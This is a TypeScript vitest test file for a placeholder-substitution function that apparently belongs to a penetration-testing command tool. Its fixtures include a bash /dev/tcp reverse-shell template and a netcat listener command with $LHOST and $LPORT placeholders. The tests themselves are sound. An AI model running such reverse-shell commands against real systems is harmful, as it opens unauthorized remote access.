import { describe, it, expect } from "vitest";
import { substitute } from "./substitute";

describe("substitute", () => {
  it("substitutes when all placeholders are set", () => {
    const out = substitute(
      "nc $LHOST $LPORT / curl $TARGET:$PORT",
      { lhost: "10.0.0.1", lport: "4444", target: "192.168.1.1", port: "80" },
    );
    expect(out).toBe("nc 10.0.0.1 4444 / curl 192.168.1.1:80");
  });

  it("leaves placeholder intact when no value is provided", () => {
    const out = substitute("bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1", {});
    expect(out).toBe("bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1");
  });

  it("does not substitute partial matches — $LHOSTNAME stays unchanged", () => {
    const out = substitute("$LHOSTNAME/$LHOST", { lhost: "1.2.3.4" });
    expect(out).toBe("$LHOSTNAME/1.2.3.4");
  });

  it("returns empty string unchanged", () => {
    expect(substitute("", { lhost: "1.1.1.1" })).toBe("");
  });

  it("returns body unchanged when it has no placeholders", () => {
    const body = "whoami /priv";
    expect(substitute(body, { lhost: "1.1.1.1", lport: "9001" })).toBe(body);
  });

  it("substitutes $LHOST when it appears twice", () => {
    const out = substitute("$LHOST $LHOST", { lhost: "10.10.10.10" });
    expect(out).toBe("10.10.10.10 10.10.10.10");
  });
});
